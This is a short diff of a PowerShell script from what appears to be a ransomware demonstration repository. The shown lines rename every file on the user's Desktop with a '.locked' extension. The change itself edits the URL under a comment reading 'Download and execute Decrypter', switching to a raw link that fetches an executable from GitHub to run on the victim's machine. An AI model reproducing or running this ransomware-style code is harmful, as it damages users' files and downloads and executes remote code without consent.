@@ -29,7 +29,7 @@ Add-Type -TypeDefinition $setwallpapersrc
 Get-ChildItem $HOME\Desktop\* | Rename-Item -NewName {$_.name + ".locked"}
 
 # Download and execute Decrypter
-$url = "https://github.com/V4T3X/RansomwareDemo/blob/558287d2cfcc4fe7cba190d297dfa1f70c111c52/Decrypter.exe"
+$url = "https://raw.githubusercontent.com/V4T3X/RansomwareDemo/refs/heads/main/Decrypter.exe"
 
 $desktopPath = [System.Environment]::GetFolderPath('Desktop')
 
